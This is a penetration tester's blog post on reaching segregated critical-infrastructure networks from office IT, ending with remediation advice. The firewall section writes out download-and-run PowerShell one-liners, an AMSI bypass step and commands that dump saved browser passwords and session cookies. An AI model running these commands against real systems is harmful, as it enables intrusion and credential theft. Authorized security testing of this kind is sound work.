---
title: "On how to access (protected) networks"
layout: "post"
---

This post is about common misconfigurations and attack szenarios that enable an attacker to access saparated networks with critical systems or sensitive data. The content is heavily inspired by my personal experience in real world projects and company networks.

<!--more-->

I had the idea for this post and just wrote everything up from my mind. So don't expect any special new content.

## Introduction

For given reasons, germany enforced many new regulations and laws to companies in different sectors to improve their Cyber-/IT-security in the last years. The so called `KRITIS` companies and organisations - which hold critical infrastructure - were defined. If those companies/organisations are target of an for example Advanced Persistent Thread (APT) with destructive motivations, this can in the worst case lead to serious Implications for state and population. Those `KRITIS` companies have for example perform the certification `ISO 27001`, which is a cyber security best practice specification for an information security management system. Some `KRITIS` sectors are the following:

* Energy sector
* Water sector
* Food sector
* Finance and insurance
* others

Imagine the power supply in an entire country or even in several countries is down. Your imagination will not cover all those worst case impacts coming from such a cyber thread. To get a good idea of the impacts, I can highly recommend the book *Blackout* by Marc Elsberg: 

<p align="center">
          <img src="/assets/posts/AccessProtected/Blackout.jpg">
</p>

As a result of the new laws and certification requirements, the included `KRITIS` companies did more and more penetration tests as well as other security assessments. We as <a href="https://www.r-tec.net/home.html">r-tec</a> have developed a sample project blueprint for the energy sector, in which possible access routes to electricity control networks have to be identified by us. The same blueprint and the work packages from it can be used for any network separation test. In many of those projects, we were able to get access to those networks via different misconfigurations or vulnerabilities. With access to a control network it's possible to more or less *just* turn off the electricity for a town. The same misconfigurations and vulnerabilities in the network separation field can also be found in any other company which separates sensitive networks. Production networks, research networks, healthcare devices, Nuclear power plants are only a little piece of many sensitive areas. There are many reasons to implement a proper network separation. In this post I'm gonna show some of the most common findings we saw in the last five years. The focus is on attack szenarios from the Office-IT as attacker source to the separated network as target.

## Possible entry points for attackers

There are well known attack vectors, that apply not only to sensitive separated networks but to all IT networks and organisations in general:

1. Vulnerabilities and/or misconfigurations on systems accessible via internet - this will in the most cases be a missing Multi-Factor-Authentication (MFA) in combination with weak passwords, a vulnerability in a web application or outdated systems/services.
2. Missing employee Awareness - for example Phishing or the handling with any Bad/malicious devices (USB,cables and so on) can lead to initial access in a network. The attacker will in theese szenarios most of the time get access to the Office-IT network and not into the separated network.
3. Physical location security - The most isolated networks are senseless, if an attacker with physical access can just go straight into the building and plug in a rogue device. Depending on the network and or environment, there may also be many small individual locations, that are allowed to connect to the main control network. Theese may be very far away (in terms of kilometers) and only secured by a small lock or not at all.
4. Supply-Chain-Attacks - A manufacturer or service provider is compromised so that, for example, malicious code can be delivered with a legitimate update (Solarwinds-Hack from 2020 like)
5. Watering hole attacks - The attacker compromises a webserver which is often visited by employees of the target company. The Browser and therefore the clients are compromised by malicious attacker hosted code or maybe just credentials are phished.

The first three attack vectors can be checked by a penetration testing company. The fourth and fifth cannot get audited as it would need to compromise third party companies/organisations which is - without their consent - illegal.

Our blueprint project mentioned above covers therefore the first three attack vectors:
* Critical internet facing system vulnerabilities
* Phishing for credentials or initial access via C2-Stager
* A physical location security checkup
* Lateral movement attempts from the Office-IT into the separated network
* A penetration test in the separated network itself

As I wrote before, most times an attacker gets access to the Office-IT network *only* by exploiting vulnerabilities or missing Awareness. The possible misconfigurations/vulnerabilities in exactly this area will be covered in this post. So the above szenarios are all relevant but not included here.

## Dual-Homed-Hosts

Dual-Homed-Hosts are Systems, that have not only one network interface, but multiple in different networks. Imagine an production network administrator wants to have access to his console from his Office-IT client. He may patch a direct connection into the production network and connect his client to it via seccond network interface: 

<p align="center">
          <img src="/assets/posts/AccessProtected/DualHomed.JPG">
</p> 

There could also be a Webserver for example, that collects and visualizes data from the remote network:

<p align="center">
          <img src="/assets/posts/AccessProtected/WebServer.JPG">
</p>

Theese systems are therefore not protected by the Firewall, which separates the networks from each other.

Getting access to the remote network via Dual-Homed-Hosts is straight forward. If the attacker already got higher privileges in the Office-IT domain via <a href="https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/">Most common on premise vulnerabilities and misconfigurations</a> he can just pwn the administrators client system and afterwards pivot into the remote network via for example a socks proxy or port forwarding. I won't cover pivoting here, there are plenty other resources and posts about it.

But how do we find theese Dual-Homed-Host systems? If you face an Windows environment, there are at least two protocols which allow us to enumerate remote networks *without authentication*:
* NetBIOS
* RPC via IOXIDResolver interface

We don't need any user at all for enumeration in both cases. If NetBIOS is enabled on the Dual-Homed-Host we can enumerate it's seccond network interface with the tool <a href="https://github.com/hdm/nextnet">nextnet</a>. If you look at the README, the usage is pretty simple:

```batch
$ nextnet 192.168.100.0/24

{"host":"192.168.100.22","port":"137","proto":"udp","probe":"netbios","name":"Horst-PC","nets":["192.168.100.22","10.10.15.22"],"info":{"domain":"office.local","hwaddr":"15:ee:a8:e4:10:a0"}}
```
As we can see in the output, a seccond network interface has the IP-Address 10.10.15.22. So we found a Dual-Homed-Host. This scan can result in false positives, as any system can have VPN network interfaces, virtual machine interfaces and so on.

Airbus Cyber Security released an <a href="https://airbus-cyber-security.com/de/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">oxid resolver blog post</a> with research to the subject in 2020. They also provided a PoC tool to find remote networks via IOXIDResolver Interface. Later on <a href="https://twitter.com/mysmartlogon">Vincent LE TOUX</a> integrated this enumeration technique into <a href="https://github.com/vletoux/pingcastle/blob/master/Scanners/OxidBindingScanner.cs">Pingcastle</a>, which makes the enumeration of network interfaces for all systems in the whole domain pretty easy. It's just about starting it, switch into the scanner menu and choose `a-oxidbindings` and afterwards `1-all`:

<p align="center">
          <img src="/assets/posts/AccessProtected/PingCastle.JPG">
</p>

I myself also stole this code to make it work as standalone binary - <a href="https://github.com/S3cur3Th1sSh1t/SharpOxidResolver">SharpOxidResolver</a> ready for C2.

Without arguments it will search the current domain for computers and get bindings for all of them.

You can also pass a hostname or IP-address to scan this specific target:
```batch
SharpOxidResolver.exe 192.168.100.22
```

If your target Dual-Homed-Host is not domain joined, you have to search for vulnerabilities on service level or web application level to compromise it. You may also be able to enumerate informations about a (possibly used) remote domain.

Currently I don't know any linux specific tools or flaws that allow remote network Interface enumeration without authentication. But common ways to enumerate them are for example SNMP *read* Community Strings.

We as penetration testers have limited time to find those systems, so don't mind to just ask your client for any known systems. If there are some, take a close look at them. They are a quick win.

## Vulnerabilities in exposed services

In the network separation projects we often asked the client about services of the target network intentionally allowed via the firewall. In very very few cases an *any any block* rule is used. The most used services from a separated network were the following:
* SMB or SAMBA share (Port 445) - many times used for data exchange between the networks
* HTTP/HTTPS Webserver (80,443) - Web Applications for data visualisation or status monitoring
* MySQL (3306) or MSSQL (1433) Database - data exchange

<p align="center">
          <img src="/assets/posts/AccessProtected/VulnerableServices.JPG">
</p>

If you find port 445 with a network share it comes to the usual enumeration and or exploitation steps. Keywords here would be <a href="https://github.com/m8r0wn/nullinux">rid cycling via null session</a>, passwort spraying or just the analysis of the data in the share if accessible. In the worst case an attacker can compromise the system with a highly privileged user via <a href="https://pentestlab.blog/2020/07/21/lateral-movement-services/">SMB Service creation lateral movement</a>.

Finding web application vulnerabilities is definitely a way too big and out of scope topic for this post. But we found critical web application vulnerabilities in the past, which allowed us to compromise the webserver and to move into the target network via theese vulnerabilities. I personally really learned to love <a href="https://github.com/sensepost/reGeorg">reGeorg</a> as pivot webshell via a compromised webserver.

## Terminal Servers or *direct* access

One more thing we saw in different environments was a dedicated terminal server used as jump host to administrate the remote network. If a client tells me, that a terminal server is in use I'm almost sure, that it's only a matter of time to get access. Common mistakes for the implementation of a terminal server we saw were the following:
* No Multi-Factor-Authentication in use. A really bad idea. The RDP Login Credentials are saved on the client-systems. If the clients gets compromised, an attacker can get access to the Terminal Server via <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210529">Credential Dumping</a> or <a href="https://github.com/djhohnstein/WireTap">keylogging</a>. 
* A Terminal Server in the Internet DMZ network - Imagine a single Internet accessible system gets compromised. If the DMZ systems themself are not completely isolated from each other, an attacker would have access to the Terminal Server services such as RDP/SMB/WMI and so on via the compromised host.

Some customers told me that their Terminal Server has some sort of Kiosk mode activated. And I always told them - `¯\_(ツ)_/¯` - I never faced a Kiosk mode so far where breaking out wasn't possible. A pretty good list for Kiosk breakout techniques can be found <a href="https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/">in this TrustedSec blog post</a>. 

Others didn't use any Terminal Server at all but instead allowed the `Remote Desktop Protocol`, `VNC` or other authentication protocols directly. If you allow any authentication protocol directly, it is only a matter of time for an attacker to get the corresponding credentials. In my personal opinion the whole separation was waste of effort in this case.

## Shared infrastructure components

In certain projects we also saw separated networks using shared infrastructure components with the Office-IT. An Office-IT compromise by us led to a separated network compromise in theese cases. Examples for bad practices in this field are:

* Shared WSUS Server - tools like <a href="https://github.com/AlsidOfficial/WSUSpendu">WSUSpendu</a> can be used here to deliver malicious fake updates to systems in the separated network.
* Active Directory Trust - this exploitation path should be straight forward
* Shared DNS Server - attackers compromising the DNS Server can come into the Man-in-the-Middle position for separated network systems (if they are allowed to connect to remote networks or to the Internet). This can in the worst case also lead to system compromises.
* Shared AV Server - Depending on the AV software in use, attackers can compromise connected clients or servers via central server. One example PoC tool is <a href="https://github.com/ThunderGunExpress/BADministration">BADministration</a> for McAfee in this case.
* Shared software inventory Server - if you are using third party software for Updates and software installation a compromise of the central server can also be abused to install malicious packages on hosts in the separated network

<p align="center">
          <img src="/assets/posts/AccessProtected/SharedWSUS.JPG">
</p>

You should therefore always ask the client for shared infrastrutcure components. Finding those manually may require much more effort than just asking this one question. Normally they want to know their vulnerabilities and you want to find them. Win for both parties. If you have a blackbox approach here it's about checking all those possible components and their connected devices/clients/servers.

## Compromising the Firewall

Most of our clients initially think, that compromising a Firewall needs an outdated system and exploits. But I actually never compromised a Firewall via exploits but really often via the administrators Client-PC or via Jump-Hosts. If you already got high privileges in the Office-IT domain you can do some enumeration to find the system administrators. Depending on the environment, especially in smaller ones the administrators are most likely members of the `Domain Admins` group and have personalised accounts. This is a bad practice but let's us find them pretty fast.

```batch
net group "Domain Admins" /domain
```

If a Jump-Server is in use, you can find that by for example filtering the *most administrative session* systems in Bloodhound. Otherwise, the system may have a *jump* or *admin* in it's description field or even in the hostname. I'll only show the AD-Module way for enumeration here, which can be imported with:

```batch
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')

or

Import-Module ActiveDirectory
```

The Powershell script is basically the AD-Module DLL base64 decoded and imported via `Assembly::load` - so this works on any client or server without additional installations. Afterwards you can query Computers for description fields with:

```batch
Get-ADComputer -Filter {Description -Like '*admin*'} -Properties Description | Select Description
```
or
```batch
 Get-ADComputer -Filter {Name -Like '*admin*'} | Select Name
```

There also may be Active Directory related groups for the Firewall, because the Firewall admins have a seperate E-Mail inbox or a network share for documentations, which usually has some Group Policies applied to it.
```batch
Get-AdGroup -Filter {name -like "*firewall*" -and name -like "*sophos*" -and name -like "*anyothervendor*"}
```
You may also find information about administrative accounts or Jump-Hosts in network shares, E-Mails, an intranet/Sharepoint and so on. Many enumeration ways as usual.

After finding the correct group or users, you can compromise his/her system (or the jump host) via any lateral movement technique like SMB/WMI/WinRM and so on. I personally often had success to get Firewall credentials by finding passwords saved in the Browser. There are tools for any Browser, the most used Browser is Chrome at the time of writing so I'm gonna show the in my Opinion best tool for that - <a href="https://github.com/djhohnstein/SharpChromium">SharpChromium</a>:

```batch
AMSIBypass
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "logins"
```

If the user has no credentials saved but is logged in to the Firewalls management page you can also dump the cookies via

```batch
Invoke-SharpChromium -Command "cookies"
```

and import them in your own browser with the extension *Cookie Editor*. This also grants authentication. To dump the users credentials, you usually need to execute the tool in the users context. Alternatively you can decrypt all DPAPI keys with the SYSTEM's masterkey. This needs a `SYSTEM` shell - <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> for example does this. To get a shell in the user context instead, you can use <a href="https://github.com/0xbadjuju/Tokenvator">Token impersonation</a> or by injecting your C2-Stager shellcode into a process of the target user. I just did built a custom TokenVator tool exactly for this purpose, which will be publicy released in roundabout a month. Currently it's only available as Sponsorware:

<a href="https://twitter.com/ShitSecure/status/1401483717684629505">SharpImpersonation</a> 

If single-sign-on is used for authentication, you can also just dump the users credentials and login with his domain account. Any other remote system management software can also hold the needed credentials, so take a look for MobaXterm, MremoteNG, WinSCP and so on. If you have enough time, keylogging the user will also give you credentials sooner or later.

After getting Firewall Credentials, access to the separated network is possible via adding your own access rules.

## Enumeration from the Office IT aka Domain Admin is not the end goal

We also had some clients, who didn't want to give us any information about the network or the infrastructure. We therefore had to stick on the BlackBox approach and find all nessesary information on our own. So after elevating privileges via <a href="https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/">Common vulnerabilities</a> we had to search for information about the separated network.

With the Introduction of <a href="https://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/">Mailsniper</a> I read a sentence I fully agree with in (wow almost 2016):

---
**BackHills InfoSec: Quote**

Oftentimes, on penetration tests we find ourselves having elevated access (Domain Admin) within an organization. Some firms stop there thinking that DA is the end goal. But it’s not. “Getting DA” means nothing to most members of the C-suite level if you can’t provide a picture of what that means in terms of risk. One of the best ways to demonstrate risk to an organization is to show the ability to gain access to sensitive data.

---

Getting a `Domain Admin` is not the end goal for me but the *start* of the fun part. So this also gives us the first field in which to search for information: E-Mail inboxes again. You can search for keywords like the networks name for example. You may also find people responsible for the separated network via OSINT techniques or just the clients websites. Any can search their inboxes for informations like IP-Addresses, network ranges and so on. If you know the users, you can search the Active Directory for their groups. In the most cases we found Active Directory groups related to the sensitive network because of (like above) Mail inboxes, network shares for the department or other Group Policy delegated resources. 

If you found the users and their groups you can take a closer look at the Group Policies to find related network shares. Theese may contain documentations for the network, Firewall rules, infrastructure information and more. If a separation was done because of a certification like the above mentioned `ISO27001` you can also search network shares, the Intranet, a Sharepoint or other internal sites for information about that term.

Enumeration can be a really blunt work. Just some weeks ago I went through nearly all documents of a Sharepoint for 1.5 days just to search for alternatives to the VPN login. And finally found something. It's about searching, searching, searching and reading, reading, reading. To sum up, it's about information gathering via following channels:
* E-Mail Inboxes
* Internal & External websites
* Active Directory groups & users

If that's in scope, you can also just call the company on any found phone number and ask the employees about co-workers from specific areas. The most people tend to give an answer on the telephone.

## Remediation / best practice

The highest protection will come from a physical separation instead of Firewall usage. This will eliminate all risks in this post except the physical site security and employee awareness.

If not needed, disable Internet access and remote network access for the sensitive network. If it's completely isolated, many risks fall apart.

Don't use Dual-Homed-Hosts if not necessarily needed. If you have no alternative, hardening, hardening, hardening. Use the host Firewall to block any traffic from systems that don't need access. A whitelist for the few devices that need access should fit best. The risk of an attacker stealing credentials from the connecting systems will still remain.

Tripple check the services, that are reachable via Firewall. The best protection obviously comes from no open ports at all. If you leave services open, hardening, hardening, hardening again. Same measures as for Dual-Homed-Hosts.#

Don't re-use any infrastructure components from other (unprotected) networks. This can lead to a compromise of the sensitive network.

Saving credentials in any software on the client or on a jump host is not a good idea. Use a passwort manager with MFA instead. Jump hosts also should be hardened to make it harder for attackers accessing them.

Use two Firewalls from different vendors behind each other. We analysed environments, where the clients IT team only administrated the first one and the seccond was administrated by a third party vendor. This almost completely eliminated the risk of a Firewall compromise via exploits or credential extraction.

## Conclusion

This little write-up should have given you all a little imagination on how we @r-tec check network separations. Doing an nmap-scan and saying "everything looks good, nothing reachable" is definitely not enough here. If some of you pentesters do a network separation check next time or talk to a customer in a presales meeting mention theese szenarios. It takes more time to analyse all theese points but gives more reliable results.

For all the Blue Team people reading this - I hope you have also learned one or two things from this article.

If I missed some important things, feel free to DM me at one of the channels from above.

Feedback is welcome as always! 

## Links & Resources

* r-tec - <a href="https://www.r-tec.net/home.html">https://www.r-tec.net/home.html</a>
* The most common on premise vulnerabilities and misconfigurations - <a href="https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/">https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/</a>
* Nextnet - <a href="https://github.com/hdm/nextnet">https://github.com/hdm/nextnet</a>
* Airbus blog post - <a href="https://airbus-cyber-security.com/de/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://airbus-cyber-security.com/de/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a>
* PingCastle - <a href="https://github.com/vletoux/pingcastle/">https://github.com/vletoux/pingcastle/</a>
* SharpOxidResolver - <a href="https://github.com/S3cur3Th1sSh1t/SharpOxidResolver">https://github.com/S3cur3Th1sSh1t/SharpOxidResolver</a>
* Nulllinux - <a href="https://github.com/m8r0wn/nullinux">https://github.com/m8r0wn/nullinux</a>
* Lateral Movement SMB - <a href="https://pentestlab.blog/2020/07/21/lateral-movement-services/">https://pentestlab.blog/2020/07/21/lateral-movement-services/</a>
* reGeorg - <a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a>
* Mimikatz - <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210529">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210529</a>
* WireTap - <a href="https://github.com/djhohnstein/WireTap">https://github.com/djhohnstein/WireTap</a>
* Kiosk Breakout - <a href="https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/">https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/</a>
* WSUSPendu - <a href="https://github.com/AlsidOfficial/WSUSpendu">https://github.com/AlsidOfficial/WSUSpendu</a>
* BADministration - <a href="https://github.com/ThunderGunExpress/BADministration">https://github.com/ThunderGunExpress/BADministration</a>
* SharpChromium - <a href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a>
* Tokenvator - <a href="https://github.com/0xbadjuju/Tokenvator">https://github.com/0xbadjuju/Tokenvator</a>
* SharpImpersonation - <a href="https://twitter.com/ShitSecure/status/1401483717684629505">https://twitter.com/ShitSecure/status/1401483717684629505</a>
* MailSniper blog post - <a href="https://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/">https://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/</a>
* The fancy network diagram generator page - <a href="https://app.diagrams.net/">https://app.diagrams.net/</a>
* LaZagne - <a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a>
